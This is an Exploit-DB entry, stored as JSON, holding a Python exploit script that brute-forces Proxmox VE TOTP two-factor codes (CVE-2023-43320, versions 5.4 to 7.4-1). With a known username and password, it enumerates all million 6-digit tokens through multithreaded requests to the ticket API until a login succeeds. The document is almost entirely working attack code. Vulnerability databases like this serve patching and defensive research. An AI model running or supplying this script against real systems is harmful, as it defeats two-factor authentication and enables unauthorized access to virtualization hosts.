{"source": "https://www.exploit-db.com/exploits/51763", "vulnName": "Proxmox VE - TOTP Brute Force", "vulnEDBID": "51763", "vulnCVE": "N/A", "author": "CORY CLINE, GABE RUST", "exploitType": "REMOTE", "platform": "LINUX", "datePublished": "2024-01-31", "vulnContent": "# Exploit Title: Proxmox VE TOTP Brute Force\n# Date: 09/23/2023\n# Exploit Author: Cory Cline, Gabe Rust\n# Vendor Homepage: https://www.proxmox.com/en/\n# Software Link: http://download.proxmox.com/iso/\n# Version: 5.4 - 7.4-1\n# Tested on: Debian\n# CVE : CVE-2023-43320\n\nimport time\nimport requests\nimport urllib.parse\nimport json\nimport os\nimport urllib3\n\nurllib3.disable_warnings()\nthreads=25\n\n#################### REPLACE THESE VALUES #########################\npassword=\"KNOWN PASSWORD HERE\"\nusername=\"KNOWN USERNAME HERE\"\ntarget_url=\"https://HOST:PORT\"\n##################################################################\n\nticket=\"\"\nticket_username=\"\"\nCSRFPreventionToken=\"\"\nticket_data={}\n\nauto_refresh_time = 20 # in minutes - 30 minutes before expiration\nlast_refresh_time = 0\n\ntokens = [];\n\nfor num in range(0,1000000):\n    tokens.append(str(num).zfill(6))\n\ndef refresh_ticket(target_url, username, password):\n    global CSRFPreventionToken\n    global ticket_username\n    global ticket_data\n    refresh_ticket_url = target_url + \"/api2/extjs/access/ticket\"\n    refresh_ticket_cookies = {}\n    refresh_ticket_headers = {}\n    refresh_ticket_data = {\"username\": username, \"password\": password, \"realm\": \"pve\", \"new-format\": \"1\"}\n    ticket_data_raw = urllib.parse.unquote(requests.post(refresh_ticket_url, headers=refresh_ticket_headers, cookies=refresh_ticket_cookies, data=refresh_ticket_data, verify=False).text)\n    ticket_data = json.loads(ticket_data_raw)\n    CSRFPreventionToken = ticket_data[\"data\"][\"CSRFPreventionToken\"]\n    ticket_username = ticket_data[\"data\"][\"username\"]\n\ndef attack(token):\n    global last_refresh_time\n    global auto_refresh_time\n    global target_url\n    global username\n    global password\n    global ticket_username\n    global ticket_data\n    if ( int(time.time()) > (last_refresh_time + (auto_refresh_time * 60)) ):\n        refresh_ticket(target_url, username, password)\n        last_refresh_time = int(time.time())\n\n    url = target_url + \"/api2/extjs/access/ticket\"\n    cookies = {}\n    headers = {\"Csrfpreventiontoken\": CSRFPreventionToken}\n    stage_1_ticket = str(json.dumps(ticket_data[\"data\"][\"ticket\"]))[1:-1]\n    stage_2_ticket = stage_1_ticket.replace('\\\\\"totp\\\\\":', '\\\"totp\\\"%3A').replace('\\\\\"recovery\\\\\":', '\\\"recovery\\\"%3A')\n    data = {\"username\": ticket_username, \"tfa-challenge\": stage_2_ticket, \"password\": \"totp:\" + str(token)}\n    response = requests.post(url, headers=headers, cookies=cookies, data=data, verify=False)\n    if(len(response.text) > 350):\n        print(response.text)\n        os._exit(1)\n\nwhile(1):\n    refresh_ticket(target_url, username, password)\n    last_refresh_time = int(time.time())\n\n    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:\n        res = [executor.submit(attack, token) for token in tokens]\n        concurrent.futures.wait(res)\n            "}